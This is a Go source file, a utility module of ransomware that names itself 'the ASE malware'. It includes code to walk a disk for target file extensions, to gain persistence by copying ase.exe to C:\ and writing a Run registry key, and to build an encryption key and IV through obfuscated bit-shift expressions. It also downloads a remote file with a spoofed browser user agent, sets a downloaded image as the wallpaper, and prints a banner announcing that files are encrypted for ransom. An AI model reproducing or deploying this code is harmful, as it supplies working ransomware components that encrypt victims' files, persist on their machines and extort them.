package utils

import (
	"fmt"
	"io"
	"io/fs"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// DiscoverDisk is a function that returns a list of files with the given extensions
func DiscoverDisk(path string, extensionList []string) ([]string, error) {
	list_extensions := reverseEachStringInSlice(extensionList)
	var files []string
	err := filepath.WalkDir(path, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		for _, ext := range list_extensions {
			if filepath.Ext(path) == "."+ext {
				files = append(files, path)
				break
			}
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func DownloadFile(filepath string, url string) (err error) {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Create a new request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	// Set the User Agent to mimic a browser
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")

	// Get the data
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

// CopyFile copie un fichier d'une source Ã  une destination
func CopyFile(source string, destination string) error {
	// Open the source file in read-only mode
	srcFile, err := os.Open(source)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	// Create the destination file with the same permissions as the source file
	srcInfo, err := srcFile.Stat()
	if err != nil {
		return err
	}
	destFile, err := os.OpenFile(destination, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, srcInfo.Mode())
	if err != nil {
		return err
	}
	defer destFile.Close()

	// Copy the file
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return err
	}

	// Make sure the contents are flushed to disk
	err = destFile.Sync()
	if err != nil {
		return err
	}

	return nil
}

func MakePersistent(ex string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	var exPath string = filepath.Dir(ex)

	err = CopyFile(exPath+"\\ase.exe", "C:\\ase.exe")
	if err != nil {
		log.Fatal(err)
	}

	err = k.SetStringValue("ase.exe", `C:\ase.exe`)
	if err != nil {
		log.Fatal(err)
	}

	return nil
}

func ebx() uint8 {
	return uint8(unsafe.Sizeof(true))
}

// FIC_Security123!
func GetIV() string {
	return string(
		[]byte{
			((ebx()<<ebx()<<ebx()<<ebx()<<ebx()|ebx())<<ebx() | ebx()) << ebx(),
			((ebx()<<ebx()<<ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx() | ebx()),
			((ebx()<<ebx()<<ebx()<<ebx()<<ebx()<<ebx()|ebx())<<ebx() | ebx()),
			(((((ebx()<<ebx()<<ebx()|ebx())<<ebx()|ebx())<<ebx()^ebx())<<ebx()|ebx())<<ebx() ^ ebx()),
			(((ebx()<<ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx()|ebx())<<ebx() ^ ebx()),
			(((ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx()|ebx())<<ebx()<<ebx() ^ ebx()),
			(((ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx()<<ebx()|ebx())<<ebx() ^ ebx()),
			((((ebx()<<ebx()|ebx())<<ebx()|ebx())<<ebx()<<ebx()^ebx())<<ebx()<<ebx() | ebx()),
			(((ebx()<<ebx()|ebx())<<ebx()|ebx())<<ebx()<<ebx()<<ebx() ^ ebx()) << ebx(),
			(((ebx()<<ebx()|ebx())<<ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx() ^ ebx()),
			(((ebx()<<ebx()|ebx())<<ebx()|ebx())<<ebx()<<ebx() ^ ebx()) << ebx() << ebx(),
			((((ebx()<<ebx()|ebx())<<ebx()|ebx())<<ebx()^ebx())<<ebx()<<ebx()<<ebx() | ebx()),
			((ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx()<<ebx() | ebx()),
			((ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx() | ebx()) << ebx(),
			(((ebx()<<ebx()|ebx())<<ebx()<<ebx()<<ebx()|ebx())<<ebx() ^ ebx()),
			(ebx()<<ebx()<<ebx()<<ebx()<<ebx()<<ebx() | ebx()),
		},
	)
}

func eax() uint8 {
	return uint8(unsafe.Sizeof(true))
}

// TheFICeventIsImperative4Security
func GetKey() string {
	return string(
		[]byte{
			((eax()<<eax()<<eax()|eax())<<eax()<<eax() | eax()) << eax() << eax(),
			((eax()<<eax()|eax())<<eax()<<eax() | eax()) << eax() << eax() << eax(),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax() | eax()) << eax(),
			((eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax() | eax()),
			((eax()<<eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax() | eax()),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
			((((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()^eax())<<eax() | eax()) << eax(),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
			((((eax()<<eax()|eax())<<eax()<<eax()|eax())<<eax()^eax())<<eax() | eax()) << eax(),
			(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
			((eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax() | eax()),
			((((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax() | eax()),
			((eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax() | eax()),
			((((eax()<<eax()|eax())<<eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() | eax()),
			((eax()<<eax()|eax())<<eax() | eax()) << eax() << eax() << eax() << eax(),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
			(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() | eax()),
			(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
			(((eax()<<eax()|eax())<<eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()),
			((((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()^eax())<<eax() | eax()) << eax(),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
			((eax()<<eax()|eax())<<eax()<<eax() | eax()) << eax() << eax(),
			(((eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()),
			((((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax() | eax()),
			(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
			(((eax()<<eax()|eax())<<eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()),
			(((eax()<<eax()|eax())<<eax()|eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
			((((eax()<<eax()|eax())<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax() | eax()),
		},
	)
}

func reverseString(input string) string {
	runes := []rune(input)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func reverseEachStringInSlice(input []string) []string {
	for i, str := range input {
		input[i] = reverseString(str)
	}
	return input
}

func SkullArt() {
	fmt.Println("\033[5;31m")
	fmt.Println("             uu$$$$$$$$$$$uu")
	fmt.Println("          uu$$$$$$$$$$$$$$$$$uu")
	fmt.Println("         u$$$$$$$$$$$$$$$$$$$$$u")
	fmt.Println("        u$$$$$$$$$$$$$$$$$$$$$$$u")
	fmt.Println("       u$$$$$$$$$$$$$$$$$$$$$$$$$u")
	fmt.Println("       u$$$$$$*   *$$$*   *$$$$$$u")
	fmt.Println("       *$$$$*      u$u       $$$$*")
	fmt.Println("        $$$u       u$u       u$$$")
	fmt.Println("        $$$u      u$$$u      u$$$")
	fmt.Println("         *$$$$uu$$$   $$$uu$$$$*")
	fmt.Println("          *$$$$$$$*   *$$$$$$$*")
	fmt.Println("            u$$$$$$$u$$$$$$$u")
	fmt.Println("             u$*$*$*$*$*$*$u")
	fmt.Println("  uuu        $$u$ $ $ $ $u$$       uuu")
	fmt.Println(" u$$$$        $$$$$u$u$u$$$       u$$$$")
	fmt.Println("  $$$$$uu      *$$$$$$$$$*     uu$$$$$$")
	fmt.Println("u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$$")
	fmt.Println("$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*")
	fmt.Println("*$$$*     **$$$$$$$$$$$uu **$***")
	fmt.Println("          uuuu **$$$$$$$$$$uuu")
	fmt.Println(" u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$")
	fmt.Println(" $$$$$$$$$$****           **$$$$$$$$$$$*")
	fmt.Println("   *$$$$$*                      **$$$$**")
	fmt.Println("     $$$*                         $$$$*")
	fmt.Println("                                   $$$*")
	fmt.Println("\033[0m")

	fmt.Println("Welcome to the ASE malware !")
	fmt.Println("This program will encrypt your files and charge you a ransom to get them back.")
}

func Wallpaper(username string) {
	var err = DownloadFile(`C:\Users\`+username+`\Documents\wallpaper.jpg`, "https://i.imgur.com/djA5cUP.jpeg")
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
	// If on Windows, change the wallpaper
	var (
		user32DLL           = windows.NewLazyDLL("user32.dll")
		procSystemParamInfo = user32DLL.NewProc("SystemParametersInfoW")
	)
	imagePath, _ := windows.UTF16PtrFromString(`C:\Users\` + username + `\Documents\wallpaper.jpg`)
	fmt.Println("[+] Changing background now...")
	procSystemParamInfo.Call(20, 0, uintptr(unsafe.Pointer(imagePath)), 0x001A)
}
